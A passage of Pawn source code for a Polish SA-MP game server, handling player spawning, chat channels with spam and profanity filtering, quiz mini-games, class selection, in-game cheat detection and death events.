	{
 	 
		return 1;
	}
	  
	if(GetPVarInt(playerid, "Dyskoteka") == 1)
	{
		DeletePVar(playerid, "Dyskoteka");
		StopAudioStreamForPlayer(playerid);
	}
	
	if(playerid >= MAX_PLAYERS || playerid < 0) return 0;
	if(aEData[ev_lider] == playerid && aEData[ev_started]) return 1;
	

	if(!pInfo[playerid][player_logged] && pInfo[playerid][player_register])
	{
		SendClientMessage(playerid, COLOR_ERROR, " »(E) Nie mo¿esz siê zespawnowaæ. Musisz siê zalogowaæ.");
		ShowPlayerDialogLogin(playerid, ""HEX_ERROR"Musisz siê zalogowaæ aby do³¹czyæ do gry!"HEX_SAMP"");
		
		PlaySoundForPlayer(playerid, 1085);
		
		return 0;
	}
	if (pInfo[playerid][player_fishing])
	{
		pInfo[playerid][player_fishing] = false;
		new zz=0;
		while(zz!=MAX_PLAYER_ATTACHED_OBJECTS)
		{
			if(IsPlayerAttachedObjectSlotUsed(playerid, zz))
			{
				RemovePlayerAttachedObject(playerid, zz);
			}
			zz++;
		}
		ClearAnimations(playerid);
	}

	hookevent_OnPlayerSpawn(playerid);
	
	if(pInfo[playerid][player_sync] || (GetPVarInt(playerid, "flo_command")) > gettime())
	{
		pInfo[playerid][player_sync] = false;
		return 1;
	}
	
	ResetPlayerWeapons(playerid);
	
	if(CTF[ctf_team][playerid] > 0)
	{
		CTFSpawn(playerid); 
		return 1;
	}
		
	
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid, 0);
	SetPlayerTeam(playerid, playerid + 10);
	SetPlayerColor(playerid, pInfo[playerid][player_color]);	
	SetPlayerSkin(playerid, pInfo[playerid][player_skin]);
	UpdatePlayerSkin(playerid); 
	StopSpec(playerid);
	
	if(this->gangs::spawn(playerid)) return 1;
	
	if(script_DF[statees] == true && Iter_Contains(d_f_players, playerid))
		return OnPlayerSpawnToDF(playerid), 1;
		
	if(!pInfo[playerid][player_objected])
	{
		Streamer_ToggleIdleUpdate(playerid, 1);
		Streamer_ToggleItemUpdate(playerid, 0, 1);
	}
	
	if(pInfo[playerid][player_inlabirynt])
	{
		pInfo[playerid][player_inlabirynt] = false;
	}
 
 
	//Attach3DTextLabelToPlayer(gmData[player_label][playerid][1], playerid, 0.0, 0.0, 0.7);
	
	if(pInfo[playerid][player_arena])
	{
		SpawnPlayerToArena(playerid, pInfo[playerid][player_arena]);
		UpdateSpec(playerid);
		return 1;
	}
		
	if(pInfo[playerid][player_tirminssion] > 0)
	{
		Tir_ClearMission(playerid);
	}
	SetPlayerSpawn(playerid);
	PlayerText_Stats(playerid, true);
	PlayerEventTD(playerid, false); 

	
	UpdateSpec(playerid);
	
	if(!pInfo[playerid][player_1spawn])
	{ 
		if(pRob[playerid][playing])
		{
			pRob[playerid][playing] = false;
			pRob[playerid][Died] = 0;
			pRob[playerid][Role] = 0;
			pRob[playerid][Healed] = 0;
		}
	    pInfo[playerid][player_acolor] = playerid;
		new listakolorow[4500];
		for(new i=0; i<100; i++)format(listakolorow, sizeof(listakolorow), "%s{FFFFFF}%d. {%06x}Wybierz kolor nicku\n", listakolorow, i, GangColors[i]>>>8);
		Dialog_Show(playerid, DIALOG_ACOLOR, DIALOG_STYLE_LIST, "Wybierz swój kolor", listakolorow, "Zmieñ", "Zamknij");
	}
	pInfo[playerid][fpswkickerwarn] = 0;
	
	
	return 1;
} 
 
  
public OnPlayerText(playerid, text[])
{
	if(playerid >= MAX_PLAYERS || playerid < 0) return 0;

	if(!pInfo[playerid][player_logged] && pInfo[playerid][player_register])
	{
		SendClientMessage(playerid, COLOR_ERROR, " »(E) Aby móc pisaæ na chacie musisz siê zalogowaæ.");
		ShowPlayerDialogLogin(playerid, ""HEX_ERROR"Musisz siê zalogowaæ aby móc pisaæ na chacie!"HEX_SAMP"");
		
		PlaySoundForPlayer(playerid, 1085);
		
		return 0;
	}
	if(!text[0])
	{
		SendClientMessage(playerid, COLOR_ERROR, " »(E) Nie mo¿esz wys³aæ pustej wiadomoœci. :(");
		PlaySoundForPlayer(playerid, 1085);
		
		return 0;
	}
	
	 
	
	systemprintf("chat", true, "(%d) %s -> %s", playerid, playerNick(playerid), text);
	
	
	if(pInfo[playerid][player_mute] > 0 && pInfo[playerid][player_id] != 1)
	{
		SendClientMessage(playerid, COLOR_ERROR, "» Zostaniesz od-ciszony(a) za %ds", pInfo[playerid][player_mute]);
		return 0;
	}
	
	if(pInfo[playerid][player_jail] > 0)
	{
		SendClientMessage(playerid, COLOR_ERROR, "» Zostaniesz wypuszczony(a) z wiêzienia za %ds", pInfo[playerid][player_jail]);
		return 0;
	}
	
	if(text[0] == '@' && pInfo[playerid][player_admin] >= R_JADMIN)
	{
		//RankAdmin(playerid, R_JADMIN);
		
		if(!pInfo[playerid][player_admin]) return 0;
		
		format(string2, sizeof(string2), "[@ CHAT] %s (%d): {FF0066}%s", playerNick(playerid), playerid, text[1]);
		SendAdminsMessage(COLOR_RED, string2);
		return 0;
	}
	if(text[0] == '$' && pInfo[playerid][player_admin] >= R_MODERATOR)
	{
	//	RankAdmin(playerid, R_MODERATOR);
		
		if(!pInfo[playerid][player_admin]) return 0;
 		 
		format(string2, sizeof(string2), "[MOD CHAT] %s (%d): {CC00CC}%s", playerNick(playerid), playerid, text[1]);
		SendAdminsMessage(COLOR_GREEN, string2);
		SendModsMessage(COLOR_GREEN, string2);
		return 0;
	}
	
	if(text[0] == '*')
	{
	 
		if(IsPlayerInAnyVehicle(playerid))
		{
			format(string2, sizeof(string2), " [*CB %d] {b}%s (%d){/b}: %s", pInfo[playerid][player_cbchannel], playerNick(playerid), playerid, text[1]);

			foreach(new pid : Player)
			{
				if(IsPlayerInAnyVehicle(pid) && pInfo[pid][player_cbchannel] == pInfo[playerid][player_cbchannel])
					SendClientMessage(pid, 0xD2BE6EFF, string2);
			
			}
			return 0;
		}
	}
	
	if(text[0] == '#')
	{
		RankVip(playerid);
		if(pInfo[playerid][player_vip] > gettime() || Iter_Contains(Vips, playerid) || IsPlayerAdmin(playerid))
		
		format(string2, sizeof(string2), "[VIP CHAT] %s (%d): {E4B300}%s", playerNick(playerid), playerid, text[1]);

		for(new x =0; x < MAX_PLAYERS; x++)
		{
		    if(pInfo[x][player_vip] > gettime() || Iter_Contains(Vips, x) || IsPlayerAdmin(x))
		    {
		        SendClientMessage(x,COLOR_VIP, string2);
		    }
		
		}
		return 0;
	}
	
	if(text[0] == '!' && pInfo[playerid][player_isGang] && pInfo[playerid][player_gang] > 0)
	{
		
		foreach(new i : Player)
		{
			if(pInfo[playerid][player_gang] == pInfo[i][player_gang])
				SendClientMessage(i, gInfo[pInfo[playerid][player_gang]][gangColor], "[%s][GANG CHAT] %s (%d): {E4B300}%s", gInfo[pInfo[playerid][player_gang]][gangTag], playerNick(playerid), playerid, text[1]);
		}
		return 0;
	}
		
  
	if(script_tr[t_zadanie] && script_tr[statees] == true)
	{
		if(GetProgressBarValue(script_tr[tr_bar]) > 0)
		{
			switch(script_tr[t_zadanie])
			{
				case 1:
				{
					if(!strcmp(text, script_tr[t_result], true) && script_tr[t_result][0] != EOS)
					{
						script_tr[iswin][playerid] = true;
						InfoBox(playerid, "Zaliczono!");
						return 0;
					}
				}
			}
		}
	}
	if(pInfo[playerid][player_admin]<4 && pInfo[playerid][player_chatspam]++ > (pInfo[playerid][player_score] > 1500 ? (1):(2)))
	{
		SendClientMessage(playerid, COLOR_ERROR,""chat" Nie spamuj! mo¿liwoœæ pisania zosta³a chwilowo zablokowana.");
        PlaySoundForPlayer(playerid, 1085);
		
		if(pInfo[playerid][player_chatspam]++ > (pInfo[playerid][player_score] > 1000 ? (12):(8)))
		{
			pInfo[playerid][player_mute] = 120;
			SendClientMessageToAll(COLOR_SAMP, ""chat" System uciszy³ gracza %s (%d) za spam na 2 minuty.", playerNick(playerid), playerid);
		}
		
		return 0;
	}
	
	if(!strcmp(text, OPTResult, false) && OPTResult[0] != EOS && OPTCheck < 3)
	{
	
		new bool:NOP;
		
		for(new i;i<sizeof(OPTIDs);i++) if(OPTIDs[i] == playerid) NOP = true;
		
		if(!NOP)
		{
			OPTIDs[OPTCheck] = playerid;
			new text_response[32];
			new score;
			if(OPTCheck == 2)
			{
				format(text_response,sizeof(text_response),"%s",text);
				score = random(15 - 1*OPTCheck) + 1;
			}
			else if(OPTCheck == 1)
			{
				if(gmData[opt_event] == 0)
				{
					format(text_response,sizeof(text_response),"**");
				}
				else 
				{
					format(text_response,sizeof(text_response),"%s",text);
					
					new len = strlen(text_response);
					new c = random(len + 1) - 4;
					
					if(c > len) c = len - 1;		
					if(c <= 0)
					{
						text_response[0] = '*';
						text_response[1] = '*';
					}
					else 
					{
						text_response[c] = '*';
						text_response[c+1] = '*';
						text_response[c+2] = '*';
					}
				}
 				score = random(20 - 2*OPTCheck) + 1;
			}
			else if(OPTCheck == 0)
			{
				if(gmData[opt_event] == 0)
				{
					format(text_response,sizeof(text_response),"**");
				}
				else 
				{
					format(text_response,sizeof(text_response),"%s",text);
					
					new len = strlen(text_response);
					new c = random(len + 1) - 4;
					
					if(c > len) c = len - 1;
					if(c <= 0)
					{
						text_response[0] = '*';
						text_response[1] = '*';
					}
					else 
					{
						text_response[c] = '*';
						text_response[c+1] = '*';
						text_response[c+2] = '*';
					}
				}
				score = random(25 - 5*OPTCheck) + 1;
			}
			
			GivePlayerScore(playerid, score);
			GivePlayerMoney(playerid, 1000);
			
			new Float:time = float(GetTickCount() - gmData[opt_gamestart]) / 1000;
			
			switch(gmData[opt_event])
			{
				case 0:
				{
					SendClientMessageToAll(-1, " Gracz {008ae6}%s (%d){/b} rozwi¹za³ zagadkê (%s) jako %s w {008ae6}%.2fs{/b} otrzymuje %d respektu", playerNick(playerid), playerid, text_response, OPTWins[OPTCheck], time, score);
					addPointEvent(playerid, stats_matematyk);
					
					if(pInfo[playerid][player_gamematematyk] > time)
					{
						pInfo[playerid][player_gamematematyk] = time;
						SendClientMessage(playerid, COLOR_GREEN, ""chat" Nowy czas rozwi¹zywania zagadki! przepisa³eœ kod w %.2fs! Gratulacjê!", time);
					}
					
					if(gmData[opt_gamematematyk] > time)
					{
						gmData[opt_gamematematyk] = time;
						SendClientMessageToAll(COLOR_GREEN, " Gracz %s (%d) ustanowi³ nowy rekord rozwi¹zywania zagadki matematycznej! w %.2fs! Gratulacjê!", playerNick(playerid), playerid, time);
						
						this->config::savesql_float("stats/time_matematyk", gmData[opt_gamematematyk]);
						 
					}
				}
				case 1:
				{
					if(OPTCheck == 2)TextDrawHideForAll(EventTD0[0]);
					if(OPTCheck == 2)TextDrawHideForAll(EventTD0[1]);
 
					SendClientMessageToAll(COLOR_OLD_LACE, " Gracz {008ae6}%s (%d){/b} przepisa³ kod jako %s w {008ae6}%.2fs{/b} otrzymuje %d respektu", playerNick(playerid), playerid, OPTWins[OPTCheck], time, score);
					
					addPointEvent(playerid, stats_codes);
					achievement(playerid, 11);
					
					if(2.5 > time) achievement(playerid, 20);
					if(pInfo[playerid][player_gamecodes] > time)
					{
						pInfo[playerid][player_gamecodes] = time;
						SendClientMessage(playerid, COLOR_GREEN, ""chat" Nowy czas przepisywania kodu! przepisa³eœ kod w %.2fs! Gratulacjê!", time);
					}
					if(gmData[opt_gamecodes] > time)
					{
						gmData[opt_gamecodes] = time;
						SendClientMessageToAll(COLOR_GREEN, ""chat" Gracz %s (%d) ustanowi³ nowy rekord przepisanego kodu! przepisa³ kod w %.2fs! Gratulacjê!", playerNick(playerid), playerid, time);
						
						this->config::savesql_float("stats/time_codes", gmData[opt_gamecodes]);
					
					}
				}
				case 2:
				{
					if(OPTCheck == 2)TextDrawHideForAll(EventTD0[0]);
					if(OPTCheck == 2)TextDrawHideForAll(EventTD0[1]);
					
					SendClientMessageToAll(COLOR_OLD_LACE, " Gracz {008ae6}%s (%d){/b} jako %s u³o¿y³ rozsypankê '{008ae6}%s{/b}' w {008ae6}%.2fs{/b} otrzymuje %d respektu", playerNick(playerid), playerid, OPTWins[OPTCheck], text_response, time, score);
					
					addPointEvent(playerid, stats_scrable);
					
					if(pInfo[playerid][player_gamescrable] > time)
					{
						pInfo[playerid][player_gamescrable] = time;
						SendClientMessage(playerid, COLOR_GREEN, ""chat" Nowy czas uk³adania s³ówka! %.2fs sekund! Gratulacjê!", time);
					}
					if(gmData[opt_gamescrable] > time)
					{
						gmData[opt_gamescrable] = time;
						SendClientMessageToAll(COLOR_GREEN, ""chat" Gracz %s (%d) ustanowi³ nowy rekord uk³adania s³ówka! w %.2fs! Gratulacjê!", playerNick(playerid), playerid, time);
						
						this->config::savesql_float( "stats/time_scrable", gmData[opt_gamescrable]);
						 
					}
				}
			}
		}
		//OPTResult[0] = EOS;
		if(OPTCheck == 2) OPTResult[0] = EOS;
		OPTCheck++;
	
		return 0;
	}
	
	format(string2, sizeof(string2), "%s", text);
	
	new f, gwiazdki[13], warn;//, id;
	for(new i; i<sizeof(censore_)-2;i++)
	{
		f = strfind(string2, censore_[i], true);
		while (f >= 0)
		{
			warn++;
			pInfo[playerid][player_warns_censored]++;
			gwiazdki[0] = EOS;
			
			strdel(string2, f+1, f+strlen(censore_[i])-1);
			for(new e = 1, c = strlen(censore_[i]) -1; e < c; e++)
			{
				format(gwiazdki, sizeof(gwiazdki), "%s*", gwiazdki);
			}
			strins(string2, gwiazdki, f + 1);
			f = strfind(string2, censore_[i], true);
		}
	}
	
	f = strfind(string2, "  ", true);
	while (f >= 0)
	{
		strdel(string2, f, f+1);
		f = strfind(string2, "  ", true);
	}
	
	if(warn)
	{
		if(pInfo[playerid][player_warns_censored] > 5)
		{ 
			pInfo[playerid][player_warns_censored] = 0;
			pInfo[playerid][player_mute] = 30;
		}
		
	}
/*	f = strfind(string2, "!", true);
	
	while(f>0)
	{
		
		id = strval(string2[f+1]);
		
		if(!IsPlayerConnected(id) || IsChar(string2[f+1]))
		{
			f = strfind(string2, "!", true, f+1);
			continue;
		}
		if(id>9&&id<99)
		{
			strdel(string2, f, f+3);
		} 
		else if(id>99)
		{
			strdel(string2, f, f+4);
		} 
		else strdel(string2, f, f+2);
		
		strins(string2, pInfo[id][player_name], f, 255);
 	//	strins(string2, "{ffffff}", i+strlen(pInfo[id][player_showname]), 255);
 		
		f = strfind(string2, "!", true, f+1);
	}
	*/
 /*
	new length = strlen(string2), letters;
	for(new x;x<length;x++)
		if(string2[x] >= 'A' && string2[x] <= 'Z') letters++;
	
	if(length>5 && ((float(length) / float(letters)) <= 3.3 && letters > 0))
		for(new i = 0; i < length; i++)
			string2[i] = tolower(string2[i]);*/
		
	//string2[0] = toupper(string2[0]);
	if(ContainsIPEx(text))
	{
		SendClientMessage(playerid, 0x666666CC, "%d %s: %s", playerid, pInfo[playerid][player_showname], string2);
		
		pInfo[playerid][player_mute] = 20;
		foreach(new i : Admins)
		{
			SendClientMessage(i, COLOR_ERROR, " »(Admin info) Prawdopodobna próba reklamy %s (%d).", playerNick(playerid), playerid);
			SendClientMessage(i, COLOR_INFO, " » Treœæ wiadomoœci: %s", text);
			
		}
		
		systemprintf("reklamy", true, "%s -> %s", playerNick(playerid), text);
		return 0;
	}
	pInfo[playerid][player_messages]++;

	if(strfind(string2,"/q",false) != -1 || strfind(string2,"/quit",false) != -1)
	{
	    SendClientMessage(playerid,COLOR_ERROR,"Niew³aœciwa wiadomoœæ!");
	    return 0;
	}

	SendClientMessageToAll(0x666666CC, "%d %s: %s", playerid, pInfo[playerid][player_showname], string2);

	return 0;
} 



public OnPlayerClickPlayerTextDraw(playerid, PlayerText:playertextid)
{
	//if(gmData[gm_port]!=7777) printf("[0] playerid %d", playerid);
	if(pInfo[playerid][player_class])
	{ 
		/*if(playertextid == SelectSkin_[7]) //left
		{
			new s1, s2, s3;
			
			pInfo[playerid][player_skin]--;
			SetTDSkinID(pInfo[playerid][player_skin], s1, s2, s3);
			UpdatePlayerClassSelect(playerid,  s1, s2, s3);
			pInfo[playerid][player_skin] = s2;
			
			
 			return 1;
		}
		if(playertextid == SelectSkin_[9]) //right
		{
			new s1, s2, s3;
			
			pInfo[playerid][player_skin]++;
			SetTDSkinID(pInfo[playerid][player_skin], s1, s2, s3);
			UpdatePlayerClassSelect(playerid,  s1, s2, s3);
			pInfo[playerid][player_skin] = s2;
			
			
 			return 1;
		}

		new OPRS = 0;
		if(playertextid == SelectSkin_[3]
			|| playertextid == SelectSkin_[8]
			) OPRS = OnPlayerRequestSpawn(playerid);
		 	

		if(OPRS)
		{
		    SetSpawnInfo( playerid, 0, 0, 1958.33, 1343.12, 15.36, 269.15, 26, 36, 28, 150, 0, 0 );

			if(playertextid == SelectSkin_[3])
			{
				pInfo[playerid][player_skin] = pInfo[playerid][player_loadskin];
				SetPlayerSkin(playerid, pInfo[playerid][player_skin]);
				
				
				UpdatePlayerSkin(playerid);
				SpawnPlayer(playerid);
			}
			else if(playertextid == SelectSkin_[8]) //okay
			{
				SetPlayerSkin(playerid, pInfo[playerid][player_skin]);
				
				//SendClientMessage(playerid, -1, "switch skin %d", pInfo[playerid][player_skin]);
				UpdatePlayerSkin(playerid);
				SpawnPlayer(playerid);
			}
			
		}
		*/
		
		if(OnPlayerRequestSpawn(playerid))
		{
			if(playertextid == SelectSkin_[3])
			{
				pInfo[playerid][player_skin] = pInfo[playerid][player_loadskin];
				SetPlayerSkin(playerid, pInfo[playerid][player_skin]);
				
				SetSpawnInfo( playerid, 0, 0, 0, 0, 2222.36, 269.15, 26, 36, 28, 150, 0, 0 );
				
				UpdatePlayerSkin(playerid);
				SpawnPlayer(playerid);
			//	SetPlayerSpawn(playerid);
			}
		}
	}
	return 1;
}
forward SpawnPlayerExt(playerid);

public SpawnPlayerExt(playerid)
{
	SpawnPlayer(playerid);

	return 1;
}

native SendClientCheck(playerid,action,major,minor,crc);
public OnPlayerRequestClass(playerid, classid)
{
	if(IsPlayerNPC(playerid)) return 1;
	
	if(pInfo[playerid][player_sobeitStep] == 0)
	{
		pInfo[playerid][player_sobeitStep] = 1;
		SendClientCheck(playerid,0x47,0,0,0x4);
	}
	if((!pInfo[playerid][player_logged] && pInfo[playerid][player_register]))
	{
		ShowPlayerDialogLogin(playerid, "");
		//return 1;
	} 
	
	
/*	
	SetPlayerInterior(playerid, 11);
	SetPlayerPos(playerid, 508.7362, -87.4335, 998.9609);
	SetPlayerFacingAngle(playerid, 0.0);
   	SetPlayerCameraPos(playerid, 508.7362, -83.4335, 998.9609);
	SetPlayerCameraLookAt(playerid, 508.7362, -87.4335, 998.9609);
		
	switch(random(3)) 
	{
		case 0: ApplyAnimation(playerid, "SHOTGUN", "shotgun_crouchfire", 4.1, 0, 1, 1, 1, 1, 1); // strzelanie
		case 1: ApplyAnimation(playerid, "SHOTGUN", "shotgun_fire", 4.1, 0, 1, 1, 1, 1, 1);
		case 2: ApplyAnimation(playerid, "SHOTGUN", "shotgun_fire_poor", 4.1, 0, 1, 1, 1, 1, 1);
	}

	GivePlayerWeapon(playerid,27,1);  // combat shotgun
	SetPlayerArmedWeapon(playerid,27);
  */
	SetPlayerSkin(playerid, classid);
	SetTimerEx("SyncClassWeapon", 5, 0, "d", playerid);
	if(Intro[playerid][i_step] == 1) 
	{
		if(Intro[playerid][i_attachcamera])
		{
			SetPlayerPos(playerid,  -2828.2095,1258.9187,119.9658);
			SetPlayerFacingAngle( playerid, 270.3551 );
		
			SetPlayerCameraPos(playerid, -2821.2791,1260.5023,126.0735);
			SetPlayerCameraLookAt(playerid, -2834.1487,1259.1043,119.3581, 2);
			
			AttachCameraToPlayerObject(playerid, Intro[playerid][i_airobj][1]);
			
			new Float:a = 270.3551, Float:distance = 5000.0;
			#define plus_X (distance * floatsin(-a, degrees))
			#define plus_Y (distance * floatcos(-a, degrees))
			
			MovePlayerObject(playerid, Intro[playerid][i_airobj][0], -2796.81689 + plus_X, 1256.94727 + plus_Y, 130.50000,  20.0, 0.00000, 0.00000, 84.00000);
			MovePlayerObject(playerid, Intro[playerid][i_airobj][1],-2821.9910 + plus_X, 1261.5308 + plus_Y,124.0652, 20.000000, 0.0, 0.0, 0.0);
			
			
			//MovePlayerObject(playerid, Intro[playerid][i_airobj][0], -2796.81689+500.0,1256.94727, 130.50000,  20.0, 0.00000, 0.00000, 84.00000);
			//MovePlayerObject(playerid, Intro[playerid][i_airobj][1],-2821.9910+500.0,1261.5308,124.0652, 20.000000, 0.0, 0.0, 0.0);
			
			Intro[playerid][i_attachcamera] = false;
		}

		switch(random(3)) 
		{
			case 0: ApplyAnimation(playerid, "SHOTGUN", "shotgun_crouchfire", 4.1, 0, 1, 1, 1, 1, 1); // strzelanie
			case 1: ApplyAnimation(playerid, "SHOTGUN", "shotgun_fire", 4.1, 0, 1, 1, 1, 1, 1);
			case 2: ApplyAnimation(playerid, "SHOTGUN", "shotgun_fire_poor", 4.1, 0, 1, 1, 1, 1, 1);
		}
	}
	else 
	{
		ApplyAnimation(playerid, "SHOTGUN", "shotgun_crouchfire", 4.1, 0, 1, 1, 1, 1, 1); // strzelanie
		ApplyAnimation(playerid, "SHOTGUN", "shotgun_fire", 4.1, 0, 1, 1, 1, 1, 1);
		ApplyAnimation(playerid, "SHOTGUN", "shotgun_fire_poor", 4.1, 0, 1, 1, 1, 1, 1);
	}
	
	pInfo[playerid][player_class] = true;
	return 1;
}
 
forward SyncClassWeapon(playerid);
public SyncClassWeapon(playerid)
{
	new wep = 24;
	
	switch(random(4))
	{
		case 0: wep = 24;
		case 1: wep = 27;
		case 2: wep = 26;
		case 3: wep = 34; 
	}
	GivePlayerWeapon(playerid,wep,1); 
	SetPlayerArmedWeapon(playerid,wep);
}

public OnPlayerRequestSpawn(playerid)
{
	if(IsPlayerNPC(playerid)) return 1;
	if(Intro[playerid][i_step] != 1) return 0;

	if(!pInfo[playerid][player_logged] && pInfo[playerid][player_register])
	{
		SendClientMessage(playerid, COLOR_ERROR, ""chat" (E) Aby do³¹czyæ do gry musisz siê zalogowaæ.");
		ShowPlayerDialogLogin(playerid, ""HEX_ERROR"Musisz siê zalogowaæ aby do³¹czyæ do gry!"HEX_SAMP"");
		return 0;
	}
	
/*	if(pInfo[playerid][player_sobeitStep] == 1)
	{
		if(4 == CallRemoteFunction("AntiSobeitLoaded", "d", 4))
		{
			InfoBox(playerid, "Brak odpowiedzi anticheata, prosze czekac...");
			return 0;
		}
	}
	if(pInfo[playerid][player_sobeitStep] == 2)
	{
		AddPlayerPenalty(playerid, P_KICK, INVALID_PLAYER_ID, 90, "d3d9.dll (SOBEIT!!)");
		InfoBox(playerid, "d3d9.dll detected\n\n----------------------------\n\n\nProsimy o usuniecie s0beita!");
		return 0;
	}*/
	if(!pInfo[playerid][player_class]) 
		return 0;
	
	SetPlayerVirtualWorld(playerid,0);
	StopAudioStreamForPlayer(playerid);
	
	 
	
	new Hour, Minute;
	gettime(Hour, Minute); 


	SetPlayerTime(playerid, Hour,Minute);
	SetPlayerWeather(playerid, 0);
	
	PlaySoundForPlayer(playerid, 1188);
	 
	pInfo[playerid][player_skin] = GetPlayerSkin(playerid);
	pInfo[playerid][player_class] = false;
	
	CancelSelectTextDraw(playerid); 
	TDPanorama(playerid, false);
	
	for(new i; i < 10; i++) PlayerTextDrawHide(playerid, SelectSkin_[i]);
 
	TextDrawHideForPlayer(playerid, ClassSkinInfo);
	
	UpdatePlayerSkin(playerid);

	return 1;
}
public OnPlayerDeath(playerid, killerid, reason)
{
    pInfo[playerid][player_ks] = 0;
	if(GetPVarInt(playerid, "Dyskoteka") == 1) StopAudioStreamForPlayer(playerid);

	if(pRob[playerid][playing] && Rob[Active] && !pRob[killerid][playing])
	{
		pRob[playerid][playing] = false;
		pRob[playerid][Died] = true;
		Rob[Robers] = 0;
		for(new xx =0; xx < MAX_PLAYERS; xx++)
		{
			if(pRob[xx][playing] && IsPlayerConnected(xx))
			{
			    Rob[Robers]++;
			}
		}

		new tstr[256];
		format(tstr,256,"Gracz {008ae6}%s{/b} zabi³ jednego z cz³onków rabunku. Zyskuje on 350 XP",playerNick(killerid));
		SendClientMessageToAll(-1,tstr);
		GivePlayerScore(killerid,350);
		if(pRob[playerid][Role] == 2 && Rob[Hakowanie] == 0)
		{
			GangRobEnd(5);
		}
		else if(Rob[Robers] <= 0)
		{
			GangRobEnd(1);
		}
	}
	SendDeathMessage(killerid, playerid, reason);
	ResetPlayerWeapons(playerid);
		
    if(qInfo[playerid][zapisany])
    {
        removeIsEvent(playerid);
    }

	achievement(playerid, 1);
	hookevent_OnPlayerDeath(playerid, killerid, reason);
	if(killerid != INVALID_PLAYER_ID) ShowPlayerArenaFrag(killerid);
	
	if(pInfo[playerid][player_glitchTest] == 1) pInfo[playerid][player_glitchTest] = 0;	
	
	pInfo[playerid][player_spawned]=false;
	pInfo[playerid][player_killstreak]=0;
	pInfo[playerid][player_spec] = -1;
	
	if(pInfo[playerid][player_admin] == 1) {
	    achievement(killerid, 20);
	}
	if(pInfo[playerid][player_admin] > 1) {
	    achievement(killerid, 31);
	}
	if(pInfo[playerid][player_id] == 1 && reason == 24)
	{
	    achievement(killerid, 14);
	}
	
	if(script_DF[statees] == true && Iter_Contains(d_f_players, playerid))
		return OnPlayerSpawnToDF(playerid), 1;
	
	this->gangs::death(playerid, killerid);
	
	if((playerid==killerid) || (killerid != INVALID_PLAYER_ID && !IsPlayerConnected(killerid)))
	{
		if(pInfo[playerid][anty_fakekill_warn]>3)
		{	
			//SendAdminsMessage(COLOR_RED, splitf("[BAN] Prawdopodobny flooder fake killami - %s (%s) - ZBANOWANY", pInfo[playerid][player_name], pInfo[playerid][player_ip]));
			
			printf("Prawdopodobny flooder fake killami - %s (%d) - ZBANOWANY", playerNick(playerid), playerid);
		//	BanEx(playerid, "Prawdopodobny flooder fake killami");
			Kick(playerid); 
		}
		else
		{
			pInfo[playerid][anty_fakekill_warn]++;
		}
		return 1;
	}
	
	if(GetTickCount()-pInfo[playerid][anty_fakekill_lasttc] < 2000 && killerid != INVALID_PLAYER_ID && pInfo[playerid][anty_fakekill_lasttc] !=0)
	{
		if(pInfo[playerid][anty_fastkill_warn]>3)
		{
		//	SendAdminsMessage(COLOR_RED, splitf("[BAN] Prawdopodobny flooder fast killami - %s (%s) - ZBANOWANY", pInfo[playerid][player_name], pInfo[playerid][player_ip]));
			printf("Prawdopodobny flooder fast killami - %s (%d) - ZBANOWANY", playerNick(playerid), playerid);
			//BanEx(playerid, "Prawdopodobny flooder fast killami");
			Kick(playerid); 
		}
		else
		{
			pInfo[playerid][anty_fastkill_warn]++;
		}
		return 1;
	}
	
	if(GetTickCount()-pInfo[playerid][anty_fakekill_lasttc] < 45000 && pInfo[playerid][anty_fakekill_lasttc]!=0 && (pInfo[playerid][anty_fakekill_warn]))
	{
		pInfo[playerid][anty_fakekill_warn] = 0;
		pInfo[playerid][anty_fastkill_warn] = 0;
	}
	
	pInfo[playerid][anty_fakekill_lasttc] = GetTickCount();
	
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
		
	pInfo[playerid][player_deathobject] = CreateObject(18668, x, y, z + 0.30, 0.0, 0.0, 0.0, 100.0);
	pInfo[playerid][player_deathcamera] = 4;
		
	if(killerid > MAX_PLAYERS || !IsPlayerConnected(killerid))
	{
		pInfo[playerid][player_suicide]++;
		
		if(pInfo[playerid][player_inlabirynt])
			pInfo[playerid][player_inlabirynt] = false;
	
		if(pInfo[playerid][player_arena])
		{
		//	SendClientMessageToAll(COLOR_ERROR, "[SUICIDE_ON_ARENA] %s was killed by INVALID_PLAYER_ID on arenas %d", playerNick(playerid), pInfo[playerid][player_arena]);
			printf("what only? player killered is arena (%d) player %s (%d)  killer %d reason %d", pInfo[playerid][player_arena], playerNick(playerid), playerid, killerid, reason);
		}
		if(pInfo[playerid][player_vip] > gettime() || pInfo[playerid][player_vip] == -1)
		{
			SendClientMessage(playerid, COLOR_TURQUOISE_1, "» Nie tracisz punktu respektu za zabójstwo poniewa¿ posiadasz konto VIP!");
		}
		else
		{
			GivePlayerScore(playerid, -1);
			SendClientMessage(playerid, COLOR_DEEP_SKY_BLUE_1, "» Tracisz punkt respektu za samobójstwo");
		}
		#if defined ADUIO_PLUGIN
		Audio_PlayEx(playerid, DEAD_SOUND);
		#endif
	}
	else
	{
		if(pInfo[killerid][player_lastkillerid] != playerid) 
		{
				pInfo[killerid][player_skill]++;
				if(pInfo[playerid][player_skill]>0) 
					pInfo[playerid][player_skill]--;
				
				if(((pInfo[killerid][player_killstreak]++,pInfo[killerid][player_killstreak])%10) == 0) achievement(killerid, 28); 
				if(pInfo[playerid][player_killstreak]>0) pInfo[playerid][player_killstreak] = 0;
				
		}
		AddKillStreak(killerid);
		pInfo[killerid][player_lastkillerid] = playerid;	 

			
		TogglePlayerSpectating(playerid, 1);
		PlayerSpectatePlayer(playerid, killerid);
		TDPanorama(playerid, true);
		
		//IsPlayerInRangeOfPoint doda³em po to je¿eli gracz z labiryntu dosta³ siê np na lv. 
		if(pInfo[playerid][player_inlabirynt])// && IsPlayerInRangeOfPoint(killerid, 100.0, 1154.4518,1360.0472,10.8203))
		{
			pInfo[playerid][player_inlabirynt] = false;
		
			if(IsPlayerInRangeOfPoint(killerid, 100.0, 1154.4518,1360.0472,10.8203))
				AddPlayerPenalty(killerid, P_JAIL, INVALID_PLAYER_ID, 60, "Labirynt Kill");
		}
		if(GetPVarInt(playerid, "killer") < gettime())
		{
			if(!pInfo[killerid][player_admin])
			{
				if(GetPlayerState(killerid) == PLAYER_STATE_DRIVER && reason !=50 && reason !=54)
				{
					if(IsPlayerStreamedIn(killerid, playerid)) //fixed random player jail 
					{
						AddPlayerPenalty(killerid, P_JAIL, INVALID_PLAYER_ID, 90, "Drive By");
					}
				}
				if(GetPlayerState(killerid) == PLAYER_STATE_DRIVER && reason == 54)
				{
